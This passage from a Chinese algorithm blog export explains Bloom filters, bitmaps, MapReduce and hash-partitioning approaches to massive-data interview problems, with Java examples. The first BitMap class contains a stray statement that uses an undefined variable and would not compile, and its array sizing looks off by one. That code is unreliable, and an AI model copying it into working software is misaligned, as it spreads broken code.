Filter，被译作称布隆过滤器，是一种空间效率很高的概率型数据结构（probabilistic data structure），特点是高效地插入和查询，可以用来告诉你 “某样东西一定不存在或者可能存在于特定集合中”。 Bloom filter 可以看做是对 bit-map 的扩展，它的原理是： 当一个元素被加入集合时，通过 K 个 Hash 函数将这个元素映射成一个位阵列（Bit array） 中的 K 个点，且把这些点的值置为 1。 当需要判断这个元素是否存在在集合时，将这个元素分别再放到这 K 个 Hash 函数中，我们只要看看此时分别映射到的这 K 个点是不是都是 1，就（大约） 知道这个元素是否存在于集合中了： 如果这些点有任何一个点的值为 0，则被检索元素一定不在于集合中； 如果所有这些点的值都是 1，则被检索元素很可能存在于集合中。 但 Bloom Filter 的这种高效是有一定代价的：在判断一个元素是否属于某个集合时，有可能会把不属于这个集合的元素误认为属于这个集合（false positive）。因此，Bloom Filter 不适合那些“零 错误”的应用场合。而在能容忍低错误率的应用场合下，Bloom Filter 通过极少的错误换取了存储空间的极大节省。 布隆过滤器数据结构布隆过滤器是一个 bit 向量或者说 bit 数组，长这样： 如果我们要映射一个值到布隆过滤器中，我们需要使用多个不同的哈希函数以生成多个哈希值，并对每个生成的哈希值进行 mod 运算（取余运算），最终得到一个特定的 bit 位索引，将这个 bit 位的值置 1，例如针对值 “baidu” 和三个不同的哈希函数分别生成哈希值并取余，得到 1、4、7，则上图转变为： Ok，我们现在再存一个值 “tencent”，如果哈希函数返回 3、4、8 的话，图继续变为： 值得注意的是，4 这个 bit 位由于两个值的哈希函数都返回了这个 bit 位，因此它被覆盖了。 现在我们如果想查询 “dianping” 这个值是否存在，哈希函数返回了 1、5、8三个值，结果我们发现 5 这个 bit 位上的值为 0，说明没有任何一个值映射到这个 bit 位上，因此我们可以很确定地说 “dianping” 这个值不存在。 而当我们需要查询 “baidu” 这个值是否存在的话，那么哈希函数必然会返回 1、4、7，然后我们检查发现这三个 bit 位上的值均为 1，那么我们可以说 “baidu” 存在了么？答案是不可以，只能是 “baidu” 这个值可能存在。 这是为什么呢？答案跟简单，因为随着增加的值越来越多，被置为 1 的 bit 位也会越来越多，这样某个值 “taobao” 即使没有被存储过，但是万一哈希函数返回的三个 bit 位都被其他值置位了 1 ，那么程序还是会判断 “taobao” 这个值存在。 如何选择哈希函数个数和布隆过滤器长度很显然，过小的布隆过滤器很快所有的 bit 位均为 1，那么查询任何值都会返回“可能存在”，起不到过滤的目的了。布隆过滤器的长度会直接影响误报率，布隆过滤器越长其误报率越小。 另外，哈希函数的个数也需要权衡，个数越多则布隆过滤器 bit 位置位 1 的速度越快，且布隆过滤器的效率越低；但是如果太少的话，那我们的误报率会变高。 k 为哈希函数个数，m 为布隆过滤器长度，n 为插入的元素个数，p 为误报率 应用场景布隆过滤器的最大的用处就是，能够迅速判断一个元素是否在一个集合中。因此它有如下三个使用场景: 网页爬虫对 URL 的去重，避免爬取相同的 URL 地址 进行垃圾邮件过滤：反垃圾邮件，从数十亿个垃圾邮件列表中判断某邮箱是否垃圾邮箱（同理，垃圾短信） 有的黑客为了让服务宕机，他们会构建大量不存在于缓存中的 key 向服务器发起请求，在数据量足够大的情况下，频繁的数据库查询可能导致 DB 挂掉。布隆过滤器很好的解决了缓存击穿的问题。 问题实例问题1给你 A,B 两个文件，各存放 50 亿条 URL，每条 URL 占用 64 字节，内存限制是 4G，让你找出 A,B 文件共同的 URL。如果是三个乃至 n 个文件呢？ 分析如果允许有一定的错误率，可以使用 Bloom filter，4G 内存大概可以表示 340 亿 bit。将其中一个文件中的 url 使用一个Hash映射为这 340 亿 bit，然后挨个读取另外一个文件的 url， 检查是否与 Bloom filter，如果是，那么该 url 应该是共同的 url（注意会有一定的错误率）。” Reference 《编程之法：面试和算法心得》 详解布隆过滤器的原理，使用场景和注意事项 - https://zhuanlan.zhihu.com/p/43263751 拜托，面试官别问我「布隆」了 - https://cxyxiaowu.com/articles/2019/04/04/1554346263604.html","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Algorithm】海量数据处理 - 位图（Bitmap）","date":"2019-07-05T08:30:08.000Z","path":"2019/07/05/【Algorithm】海量数据处理-位图/","text":"Bitmap所谓的 Bit-map 就是用一个 bit 位来标记某个元素对应的 Value， 而 Key 即是该元素。由于采用了 Bit 为单位来存储数据，因此在存储空间方面，可以大大节省。 实现举个例子，假如有10亿个int数，10亿个 int 数大约是占用 $10 * 10^8 * 4 Byte = 4 GB$（注意，在 Java 中，一个 int 占用 4 个字节）。 如果对这样大的一个数据集做查找和排序，对内存的消耗是相当大的，有人说，这些数据可以不用一次性加载，那就是要存盘了，存盘必然消耗I/O，则意味着处理速度的变慢。 如果用BitMap思想来解决的话，就好很多。一个byte是占8个bit，如果每一个bit的值就是有或者没有，也就是二进制的0或者1，如果用bit的位置代表数组值有还是没有，那么0代表该数值没有出现过，1代表该数组值出现过。对应占用的内存为 $2^{32} bit = 2^{32}/8 Byte = 2^{29} Byte = 512 MB$ 。具体如下图： bitmap算法代码实现1234567891011121314151617181920212223242526272829303132333435363738class BitMap &#123; private long maxValue; private static int[] words; //构造函数中传入数据中的最大值（范围为 1-最大值） public BitMap(long maxValue) &#123; this.maxValue = maxValue; // 根据长度算出，所需数组大小 words = new int[(int) ((maxValue - 1) &gt;&gt; 5)]; // 用移位运算代替除法，效率更高 &#125; public int getBit(long index) &#123; int word = words[(int) ((index - 1) &gt;&gt; 5)]; // (index - 1) &amp; 31 相当于对 index-1 按 32 求余数 int offset = (int) ((index - 1) &amp; 31); return (word &gt;&gt; offset) &amp; 0x01; &#125; public void setBit(long index) &#123; // 求出该index - 1所在bitMap的下标 int wordIndex = (int) ((index - 1) &gt;&gt; 5); // 求出该值的偏移量(求余) int offset = (int) ((index - 1) &amp; 31); int word = words[wordIndex]; words[wordIndex] = word | (0x01 &lt;&lt; offset); (words[wordIndex] &amp; (bitIndex &gt;&gt; 1L)) &#125; public static void main(String[] args) &#123; BitMap bitMap = new BitMap(32); bitMap.setBit(32); System.out.println(bitMap.getBit(1)); System.out.println(bitMap.getBit(32)); &#125;&#125; 问题实例问题1在 2.5 亿个整数中找出不重复的整数，注，内存不足以容纳这 2.5 亿个整数。 解法解法一：采用 2-Bitmap（每个数分配 2bit，00 表示不存在，01 表示出现一次，10 表示多次， 11 无意义）进行，共需内存 $2^{32} * 2 bit=1 GB$ 内存，还可以接受。然后扫描这 2.5 亿个整数， 查看 Bitmap 中相对应位，如果是 00 变 01，01 变 10，10 保持不变。所描完事后，查看 bitmap， 把对应位是 01 的整数输出即可。 举个例子，例如我们此时读入一个数是：64，64对应的所在bit位是：64*2=128，也就是说第 127 和 128 位共同标示了它的出现状态（公式为：2 *(x - 1) -1 和 2 *(x - 1) 位）。其他的以此类推。每当我们读出一个数，我们就这样去找到它对应的bit位，先读出bit位的值，再做记录，已经是01的，再次来到，那么就应该修改为10。最后的我们这样得出结果：扫描整个位图，如果是10的，就下标/2得出这个数。 或者，进行划分小文件的方法。然后在小文件中找出不重复的整数，并排序。然后再进行归并，注意去除重复的元素。” 问题2给 40 亿个不重复的 unsigned int 的整数，没排过序的，然后再给一个数，如何快速判断这个数是否在那 40 亿个数当中？ 解法可以用位图（Bitmap） 的方法，申请 512M 的内存，一个 bit 位代表一个 unsigned int 值。 读入 40 亿个数，设置相应的 bit 位，读入要查询的数，查看相应 bit 位是否为 1，为 1 表示存在， 为 0 表示不存在。 Reference 《编程之法：面试和算法心得》","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Algorithm】海量数据处理 - MapReduce","date":"2019-07-05T08:28:26.000Z","path":"2019/07/05/【Algorithm】海量数据处理-MapReduce/","text":"MapReduceMapReduce 是一种计算模型，简单的说就是将大批量的工作（数据）分解（MAP）执行，然后再将结果合并成最终结果（REDUCE）。这样做的好处是可以在任务被分解后，可以通过大量机器进行并行计算，减少整个操作的时间。说白了，Mapreduce 的原理就是一个归并排序。 适用范围：数据量大，但是数据种类小可以放入内存。 基本原理及要点：将数据交给不同的机器去处理，数据划分，结果归约。 MapReduce 模式MapReduce 模式的主要思想是将自动分割要执行的问题 （例如程序）拆解成 Map（映射）和 Reduce（化简）的方式，如下图所示： 在数据被分割后通过 Map 函数的程序将数据映射成不同的区块，分配给计算机机群处理达到分 布式运算的效果，在通过 Reduce 函数的程序将结果汇整，从而输出开发者需要的结果。 MapReduce 借鉴了函数式程序设计语言的设计思想，其软件实现是指定一个 Map 函数，把键 值对(key/value)映射成新的键值对(key/value)，形成一系列中间结果形式的 key/value 对，然后 把它们传给 Reduce(规约)函数，把具有相同中间形式 key 的 value 合并在一起。Map 和 Reduce函数具有一定的关联性。 MapReduce 致力于解决大规模数据处理的问题，因此在设计之初就考虑了数据的局部性原理， 利用局部性原理将整个问题分而治之。MapReduce 集群由普通 PC 机构成，为无共享式架构。 在处理之前，将数据集分布至各个节点。处理时，每个节点就近读取本地存储的数据处理（map）， 将处理后的数据进行合并（combine）、排序（shuffle and sort）后再分发（至 reduce 节点）， 避免了大量数据的传输，提高了处理效率。无共享式架构的另一个好处是配合复制（replication） 策略，集群可以具有良好的容错性，一部分节点的 down 机对集群的正常工作不会造成影响。 Reference 《Distributed Computing in Java 9》 《编程之法：面试和算法心得》","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Algorithm】海量数据处理 - hash映射再取模 + hashmap统计 + 排序","date":"2019-07-05T08:21:43.000Z","path":"2019/07/05/【Algorithm】海量数据处理-hash映射再取模-hashmap统计-排序/","text":"思路于海量数据而言，由于无法一次性装进内存处理，导致我们不得不把海量的数据通过hash映射分割成相应的小块数据，然后再针对各个小块数据通过hashmap进行统计或其它操作。 那什么是hash映射呢？简单来说，就是为了便于计算机在有限的内存中处理大数据，我们通过一种映射散列的方式让数据均匀分布在对应的内存位置（如大数据通过取余的方式映射成小数存放在内存中，或大文件映射成多个小文件），而这个映射散列方式便是我们通常所说的hash函数，设计的好的hash函数能让数据均匀分布而减少冲突。 问题1 - 海量日志数据，提取出某日访问百度次数最多的那个IP题目海量日志数据，提取出某日访问百度次数最多的那个IP 分析百度作为国内第一大搜索引擎，每天访问它的 IP 数量巨大，如果想一次性把所有 IP 数据 装进内存处理，则内存容量明显不够，故针对数据太大，内存受限的情况，可以把大文件转化成 （取模映射）小文件，从而大而化小，逐个处理。 说白了，就是先映射，而后统计，最后排序： 分而治之（hash映射）：首先把这一天访问百度日志的所有 IP 提取出来，然后逐个写入到一个大文件中， 接着采用映射的方法，比如%1000，把整个大文件映射为 1000 个小文件。 hashmap统计：当大文件转化成了小文件，那么我们便可以采用 hash_map(ip, value)来分别对 1000 个小文件中的 IP 进行频率统计，再找出每个小文件中出现频率最大的 IP。 堆排序/快速排序/归并排序：统计完了之后，便进行排序（可采取堆排序/快速排序/归并排序），得到次数最多的IP。 具体而论，首先是从百度的总日志中，提取出这一天的日志来，逐个写入到一个大文件中。注意到，IP是32位的，因此最多有个$2^{32}$个IP。我们可以采用IP的hash值进行映射分割的方法（比如hash(IP)%1000），以把这一个大文件映射分割为1000个小文件，再找出每个小文件中出现频率最高的那个IP（可以采用hashmap对那1000个文件中的所有IP进行频率统计，然后依次找出各个文件中频率最大的那个IP）及相应的频率。然后再在这1000个最大的IP中，找出那个频率最大的IP，即为所求。 关于本题，还有几个问题，如下： Hash取模是一种等价映射，换句话说，不会存在同一个元素（同一个IP）被分散到不同小文件中的情况，即这里采用的是hash(IP)mod1000算法。因为相同的IP对其求hash值，它们的hash值一定相同，而再对它们的hash值取模，值仍然也一定相同。因此，相同的IP只可能落在同一个文件中，而不可能被分散到不同文件的。 那到底什么是hash映射呢？简单来说，就是为了便于计算机在有限的内存中处理大数据，从而通过一种映射散列的方式让数据均匀分布在对应的内存位置（如大数据通过取余的方式映射成小树存放在内存中，或大文件映射成多个小文件），而这个映射散列方式便是我们通常所说的hash函数，设计的好的hash函数能让数据均匀分布而减少冲突。尽管数据映射到了另外一些不同的位置，但数据还是原来的数据，只是代替和表示这些原始数据的形式发生了变化而已。 总结总结来说，对于此类只是模糊描述为海量数据，而没有给出具体数据结构的大小的问题，需要考虑因为数据太大，因而无法一次全部装入内存的情况。而且，要通过“对每条数据进行hash再取模的方法，将数据映射分割到N个小文件中”的方式来处理。 问题2 - 寻找热门查询，300万个查询字符串中统计最热门的10个查询题目搜索引擎会通过日志文件把用户每次检索使用的所有检索串都记录下来，每个查询串的长度为1-255字节。假设目前有一千万个记录（这些查询串的重复度比较高，虽然总数是1千万，但如果除去重复后，不超过3百万个。一个查询串的重复度越高，说明查询它的用户越多，也就是越热门），请你统计最热门的10个查询串，要求使用的内存不能超过1G。 分析解法1显然，我们可以采用类似问题1中的解法，即，数据大则划小，一亿个IP求Top 10，可先hash(IP)%1000，以将IP分到1000个小文件中去，并保证相同的IP只会出现在一个文件中，再对每个小文件中的 IP 进行hashmap计数统计并按数量排序，最后采用归并排序（或者最小堆排序）依次处理每个小文件的top10以得到最后的结果。 解法2但事实上，我们能将所有不重复的查询串都一次性装入内存。因此，对于这个问题，从处理速度而言，这样的方法就会比解法1要快（因为解法1中涉及大量的I/O操作）。 具体来说，虽然有一千万个检索串，但是由于重复度比较高，因此事实上只有300万的检索串，每个检索串最多占 255 Byte，因此我们可以考虑把他们都放进内存中去（假设这300万个检索串都是最大长度是），那么将占用 $255 * 3 * 10^6$ Byte 内存，即 $255 3 10^3 * 10 ^3$ Byte，即$255 *3 $ MB，约等于 765 MB（即小于 1 GB）。 因此，我们可以放弃hash映射的步骤，而直接将所有数据都放在内存中，并基于hashmap进行统计，最后排序。 具体来说： hashmap统计：先对这批海量数据预处理。具体方法是：维护一个Key为查询串，Value为该查询串出现次数的Hash表，即hash_map(Query，Value)，每次读取一个Query，如果该字串不在Hash表中，那么加入该字串，并且将Value值设为1；如果该字串在Table中，那么将该字串的计数加一即可。最终我们在$O(N)$的时间复杂度内用Hash表完成了统计； 堆排序：借助堆这个数据结构，找出Top K，时间复杂度为$N’log_2K$。即借助堆结构，我们可以在log量级的时间内查找和调整/移动。因此，维护一个K（该题目中是10）大小的小根堆，然后遍历300万的Query，分别和根元素进行对比。所以，我们最终的时间复杂度是：$O（N） + N’ * O（log_2K）$，（N为1000万，N’为300万）。 当然，你也可以采用trie树，关键字域存该查询串出现的次数，没有出现为0。最后用10个元素的最小堆来对出现频率进行排序。 总结总结来说，对于此类给出了具体的数据结构大小的问题，可以先尝试计算一下是否能够将数据一次全部放入内存中，如果可以，则不需要进行hash再取模的过程。 问题3 - 有一个1G大小的一个文件，里面每一行是一个词，词的大小不超过16字节，内存限制大小是1M。返回频数最高的100个词题目有一个1G大小的一个文件，里面每一行是一个词，词的大小不超过16字节，内存限制大小是1M。返回频数最高的100个词。 分析思路还是和上面类似： hash映射：顺序读文件中，对于每个词x，取hash(x)%5000，然后按照该值存到5000个小文件（记为x0,x1,…x4999）中。这样每个文件大概是200k左右。如果其中的有的文件超过了1M大小，还可以按照类似的方法继续往下分，直到分解得到的小文件的大小都不超过1M。 hashmap统计：对每个小文件，采用trie树或hashmap等统计每个文件中出现的词以及相应的频率。 堆/归并排序：取出出现频率最大的100个词（可以用含100个结点的最小堆）后，再把100个词及相应的频率存入文件，这样又得到了5000个文件。最后就是把这5000个文件进行归并（类似于归并排序）的过程了。 问题4 - 海量数据分布在100台电脑中，想个办法高效统计出这批数据的TOP10题目海量数据分布在100台电脑中，想个办法高效统计出这批数据的TOP10。 分析如果每个数据元素会重复出现，但是只重复出现在某一台机器中，那么可以采取以下步骤统计出现次数TOP10的数据元素： 堆排序：在每台电脑上求出TOP10，可以采用包含10个元素的堆完成（TOP10小，用最大堆，TOP10大，用最小堆，比如求TOP10大，我们首先取前10个元素调整成最小堆，如果发现，然后扫描后面的数据，并与堆顶元素比较，如果比堆顶元素大，那么用该元素替换堆顶，然后再调整为最小堆。最后堆中的元素就是TOP10大）。 求出每台电脑上的TOP10后，然后把这100台电脑上的TOP10组合起来，共1000个数据，再利用上面类似的方法求出TOP10就可以了。 但如果同一个元素会重复出现在不同的电脑中呢？ 比如，拿两台机器求top 2的情况来说：第一台的数据分布及各自出现频率为：a(50)，b(50)，c(49)，d(49) ，e(0)，f(0)，（其中，括号里的数字代表某个数据出现的频率，如a(50)表示a出现了50次）；第二台的数据分布及各自出现频率为：a(0)，b(0)，c(49)，d(49)，e(50)，f(50)。 这个时候，你可以有两种方法： 遍历一遍所有数据，重新hash取摸，如此使得同一个元素只出现在单独的一台电脑中，然后采用上面所说的方法，统计每台电脑中各个元素的出现次数找出TOP 10，继而组合100台电脑上的TOP 10，找出最终的TOP 10。 或者，暴力求解：直接统计统计每台电脑中各个元素的出现次数，然后把同一个元素在不同机器中的出现次数相加，最终从所有数据中找出TOP 10。 题目5 - 有10个文件，每个文件1G，每个文件的每一行存放的都是用户的query，每个文件的query都可能重复。要求你按照query的频度排序题目有10个文件，每个文件1G，每个文件的每一行存放的都是用户的query，每个文件的query都可能重复。要求你按照query的频度排序。 解法解法一 hash映射：顺序读取10个文件，按照hash(query)%10的结果将query写入到另外10个文件（记为a0,a1,..a9）中。这样新生成的文件每个的大小大约也1G（假设hash函数是随机的）。 hash_map统计：找一台内存在2G左右的机器，依次对用hash_map(query, query_count)来统计每个query出现的次数。注：hash_map(query, query_count)是用来统计每个query的出现次数，不是存储他们的值，出现一次，则count+1。 堆/快速/归并排序 利用快速/堆/归并排序按照出现次数进行排序，将排序好的query和对应的query_cout输出到文件中，这样得到了10个排好序的文件（记为$b_0, b_1,…, b_{10}$）。最后，对这10个文件进行归并排序（内排序与外排序相结合）。 解法二一般query的总量是有限的，只是重复的次数比较多而已，可能对于所有的query，一次性就可以加入到内存了。这样，我们就可以采用trie树或者hashmap等直接来统计每个query出现的次数，然后按出现次数做快速/堆/归并排序就可以了。 解法三与解法1类似，但在做完hash，分成多个文件后，可以交给多个文件来处理，采用分布式的架构来处理（比如MapReduce），最后再进行合并。 题目6 - 给定a、b两个文件，各存放50亿个 URL，每个 URL 各占64字节，内存限制是4G，让你找出a、b文件共同的 URL题目给定a、b两个文件，各存放50亿个 URL，每个 URL 各占64字节，内存限制是4G，让你找出a、b文件共同的 URL？ 解法可以计算出，每个文件的大小为5G×64=320G，远远大于内存限制的4G。所以不可能将其完全加载到内存中处理，因而考虑采取分而治之的方法： 分而治之（hash映射）：先遍历文件a，对每个url求hash(url)%1000，然后根据所取得的值将文件 a 中的 URL 分别存储到1000个小文件（$a_0, a_1, …, a_{999}$ 文件中）。这样每个小文件的大约为300M。再遍历文件b，采取和a相同的方式将 URL 分别存储到1000小文件中（$b_0, b_1, …, b_{999}$ 文件中）。这样处理后，所有可能相同的 URL 都在对应的小文件。关键在于，下标不对应的文件中不可能有相同的URL（因为一个特定的URL，经过hash(url)%1000后，所得的值一定相同）。因此，我们只要分别比较这1000对小文件（$a_0$ vs $b_0$, $a_1$ vs $b_1$, …, $a_{999}$ vs b_{999}$ ），并在每次比较完成后，提取出相同的 URL 即可（可以放入一个hashset）。 hashset统计 求每对小文件中相同的URL，可以将其存储到一个hashset中。 题目7 - 100万个数中找出最大的100个数题目100万个数中找出最大的100个数。 分析解法一采用局部淘汰法。选取前100个元素，并排序，记为序列L。然后一次扫描剩余的元素x，与排好序的100个元素中最小的元素比，如果比这个最小的要大，那么把这个最小的元素删除，并把x利用插入排序的思想，插入到序列L中。依次循环，知道扫描了所有的元素。复杂度为O(100万*100)。 解法二采用快速排序的思想，每次分割之后只考虑比轴大的一部分，知道比轴大的一部分在比100多的时候，采用传统排序算法排序，取前100个。复杂度为O(100万*100)。 解法三在前面的题中，我们已经提到了，用一个含100个元素的最小堆完成。复杂度为O(100万*$log_2100$)。 举一反三1、怎么在海量数据中找出重复次数最多的一个？ 提示：先做hash，然后求模映射为小文件，求出每个小文件中重复次数最多的一个，并记录重复次数。然后找出上一步求出的数据中重复次数最多的一个就是所求（具体参考前面的题）。 2、上千万或上亿数据（有重复），统计其中出现次数最多的前N个数据。 提示：上千万或上亿的数据，现在的机器的内存应该能存下。所以考虑采用hash_map/搜索二叉树/红黑树等来进行统计次数。然后就是取出前N个出现次数最多的数据了，可以用第2题提到的堆机制完成。 3、一个文本文件，大约有一万行，每行一个词，要求统计出其中最频繁出现的前10个词，请给出思想，给出时间复杂度分析。 提示：这题是考虑时间效率。用trie树统计每个词出现的次数，时间复杂度是O(nle)（le表示单词的平准长度）。然后是找出出现最频繁的前10个词，可以用堆来实现，前面的题中已经讲到了，时间复杂度是O(nlg10)。所以总的时间复杂度，是O(nle)与O(nlg10)中较大的哪一个。 4、1000万字符串，其中有些是重复的，需要把重复的全部去掉，保留没有重复的字符串。请怎么设计和实现？ 提示：这题用trie树比较合适，hash_map也行。当然，也可以先hash成小文件分开处理再综合。 5、一个文本文件，找出前10个经常出现的词，但这次文件比较长，说是上亿行或十亿行，总之无法一次读入内存，问最优解。 提示：首先根据用hash并求模，将文件分解为多个小文件，对于单个文件利用上题的方法求出每个文件件中10个最常出现的词。然后再进行归并处理，找出最终的10个最常出现的词。 Reference 《编程之法：面试和算法心得》","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Algorithm】海量数据处理","date":"2019-07-05T08:19:58.000Z","path":"2019/07/05/【Algorithm】海量数据处理/","text":"top K 问题 在大规模数据处理中，经常会遇到的一类问题：在海量数据中找出出现频率最好的前k个数，或者从海量数据中找出最大的前k个数，这类问题通常被称为top K问题。例如，在搜索引擎中，统计搜索最热门的10个查询词；在歌曲库中统计下载最高的前10首歌等。 针对top K类问题，通常比较好的方案是分治+Trie树/hash+小顶堆（就是上面提到的最小堆），即先将数据集按照Hash方法分解成多个小数据集，然后使用Trie树或 Hash 统计每个小数据集中的query词频，之后用小顶堆求出每个数据集中出现频率最高的前K个数，最后在所有top K中求出最终的top K。 何谓海量数据处理？所谓海量数据处理，无非就是基于海量数据上的存储、处理、操作。何谓海量，就是数据量太大，所以导致要么是无法在较短时间内迅速解决，要么是数据太大，导致无法一次性装入内存。 那解决办法呢？针对时间，我们可以采用巧妙的算法搭配合适的数据结构，如： 分而治之（hash映射+取模） + hashmap统计 + 堆/快速/归并排序 双层桶划分 Bloom filter/Bitmap Trie树/数据库/倒排索引 外排序 分布式处理之Hadoop/Mapreduce 针对空间，无非就一个办法：大而化小，分而治之（hash映射），你不是说规模太大嘛，那简单啊，就把规模大化为规模小的，各个击破不就完了嘛。 至于所谓的单机及集群问题，通俗点来讲，单机就是处理装载数据的机器有限（只要考虑 CPU，内存，硬盘的数据交互），而集群，机器有多辆，适合分布式处理，并行计算（更多考虑节点和节点间的数据交互）。 Reference 《编程之法：面试和算法心得》","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Algorithm Problem】海量数据处理 - 10亿int型数，统计只出现一次的数","date":"2019-07-05T01:42:21.000Z","path":"2019/07/05/【Algorithm-Problem】海量数据处理-10亿int型数，统计只出现一次的数/","text":"题目10亿int整型数，以及一台可用内存为1GB的机器，时间复杂度要求O(n)，统计只出现一次的数？ 分析首先分析多大的内存能够表示10亿的数呢？一个int型占4字节，10亿就是40亿字节（4 * 1000,000,000 Byte = 4GB），也就是如果完全读入内存需要占用4GB，而题目只给1GB内存，显然不可能将所有数据读入内存。 我们先不考虑时间复杂度，仅考虑解决问题。那么接下来的思路一般有两种。 位图法：用一个bit位来标识一个int整数。 分治法：分批处理这10亿的数。 一种是位图法，如果各位老司机有经验的话很快会想到int整型数是4字节（Byte），也就是32位（bit），如果能用一个bit位来标识一个int整数那么存储空间将大大减少。另一种是分治法，因为内存有限，因此我分批读取处理。下面大致分析一下两种思路。 位图法（Bitmap）位图法是基于int型数的表示范围这个概念的，用两个bit位来标识一个int整数，若该位为01，则说明该数出现过一次；若为00，则说明该数没有出现，若为 11，则说明该数出现超过一次。一个int整型数占4字节（Byte），也就是32位（bit）。那么把所有int整型数字表示出来需要 $2 * 2^{32}$ bit的空间，换算成字节为单位也就是$2^{33}/8$ = $2^{30}$ Byte，大约等于1GB。 123// 插播一个常识2^10 Byte = 1024 Byte = 1KB2^30 Byte = (2^10)^3 Byte = 1024 * 1024 * 1024 Byte = 1GB 这下就好办了，只需要用1GB的内存就能存储所有的int的范围数。 具体方案那么接下来我们只需要申请一个int数组长度为 int tmp[N/32+1]即可存储完这些数据，其中N代表要进行查找的总数（这里也就是$2^{32}$），tmp中的每个元素在内存在占32位，所以可得到BitMap表： tmp[0]:可表示0~15 tmp[1]:可表示16~31 tmp[2]可表示32~47 ~~ 假设这10亿int数据为：6,3,8,16,18,……，那么具体的BitMap表示为： 如何判断int数字放在哪一个tmp数组中：将数字直接除以16取整数部分（x/16），例如：整数15除以16取整等于0，那么15就在tmp[0]上；而整数 16 除以16取整等于1，那么 16 就在 tmp[1]上。 如何确定数字放在32个位中的哪个位（索引从 0 开始）：将数字mod16取模再乘以 2（x % 16 * 2）。比如，我们知道了整数 0 在tmp[0]后，如果确定其在哪一位呢？计算0 % 16 * 2 = 0，因此在tmp[0]的第 0 位。又如整数8，8 % 16 * 2 = 16，因此在tmp[0]的第 16 位（从右边数起）。 然后，我们怎么统计只出现一次的数呢？每一个数出现的情况我们可以分为三种：0次、1次、大于1次。也就是说我们需要用2个bit位才能表示每个数的出现情况。此时则三种情况分别对应的bit位表示是：00、01、11。 我们顺序扫描这10亿的数，在对应的双bit位上标记该数出现的次数。最后取出所有双bit位为01的int型数就可以了。 Bitmap拓展位图（Bitmap）算法思想比较简单，但关键是如何确定十进制的数映射到二进制bit位的map图。 优点： 运算效率高，不许进行比较和移位； 占用内存少，比如N=10000000；只需占用内存为N/8=1250000Byte=1.25M 缺点：所有的数据不能重复。即不可对重复的数据进行排序和查找。 适用场景建立了Bit-Map之后，就可以方便的使用了。一般来说Bit-Map可作为数据的查找、去重、排序等操作。比如以下几个例子： 1 在3亿个整数中找出重复的整数个数，限制内存不足以容纳3亿个整数对于这种场景可以采用2-BitMap来解决，即为每个整数分配2bit，用不同的0、1组合来标识特殊意思，如00表示此整数没有出现过，01表示出现一次，11表示出现过多次，就可以找出重复的整数了，其需要的内存空间是正常BitMap的2倍，为：3亿*2/8/1024/1024=71.5MB。 具体的过程如下：扫描着3亿个整数，组BitMap，先查看BitMap中的对应位置，如果00则变成01，是01则变成11，是11则保持不变，当将3亿个整数扫描完之后也就是说整个BitMap已经组装完毕。最后查看BitMap将对应位为11的整数输出即可。 2 对没有重复元素的整数进行排序对于非重复的整数排序BitMap有着天然的优势，它只需要将给出的无重复整数扫描完毕，组装成为BitMap之后，那么直接遍历一遍Bit区域就可以达到排序效果了。 举个例子：对整数4、3、1、7、6进行排序： 直接按Bit位输出就可以得到排序结果了。 3 已知某个文件内包含一些电话号码，每个号码为8位数字，统计不同号码的个数8位最多99 999 999，大概需要99m个bit，大概10几m字节的内存即可。可以理解为从0-99 999 999的数字，每个数字对应一个Bit位，所以只需要99M个Bit==1.2MBytes，这样，就用了小小的1.2M左右的内存表示了所有的8位数的电话。 4 2.5亿个整数中找出不重复的整数的个数，内存空间不足以容纳这2.5亿个整数将bit-map扩展一下，用2bit表示一个数即可：0表示未出现；1表示出现一次；2表示出现2次及以上，即重复，在遍历这些数的时候，如果对应位置的值是0，则将其置为1；如果是1，将其置为2；如果是2，则保持不变。或者我们不用2bit来进行表示，我们用两个bit-map即可模拟实现这个2bit-map，都是一样的道理。 最后放一个使用Byte[]数组存储、读取bit位的示例代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758class BitmapTest &#123; private static final int CAPACITY = 1000000000;//数据容量 // 定义一个byte数组缓存所有的数据 private byte[] dataBytes = new byte[1 &lt;&lt; 29]; public static void main(String[] args) &#123; BitmapTest ms = new BitmapTest(); byte[] bytes = null; Random random = new Random(); for (int i = 0; i &lt; CAPACITY; i++) &#123; int num = random.nextInt(); System.out.println(\"读取了第 \" + (i + 1) + \"\\t个数: \" + num); bytes = ms.splitBigData(num); &#125; System.out.println(\"\"); ms.output(bytes); &#125; /** * 读取数据，并将对应数数据的 到对应的bit中，并返回byte数组 * @param num 读取的数据 * @return byte数组 dataBytes */ private byte[] splitBigData(int num) &#123; long bitIndex = num + (1l &lt;&lt; 31); //获取num数据对应bit数组（虚拟）的索引 int index = (int) (bitIndex / 8); //bit数组（虚拟）在byte数组中的索引 int innerIndex = (int) (bitIndex % 8); //bitIndex 在byte[]数组索引index 中的具体位置 System.out.println(\"byte[\" + index + \"] 中的索引：\" + innerIndex); dataBytes[index] = (byte) (dataBytes[index] | (1 &lt;&lt; innerIndex)); return dataBytes; &#125; /** * 输出数组中的数据 * @param bytes byte数组 */ private void output(byte[] bytes) &#123; int count = 0; for (int i = 0; i &lt; bytes.length; i++) &#123; for (int j = 0; j &lt; 8; j++) &#123; if (!(((bytes[i]) &amp; (1 &lt;&lt; j)) == 0)) &#123; count++; int number = (int) ((((long) i * 8 + j) - (1l &lt;&lt; 31))); System.out.println(\"取出的第 \" + count + \"\\t个数: \" + number); &#125; &#125; &#125; &#125;&#125; 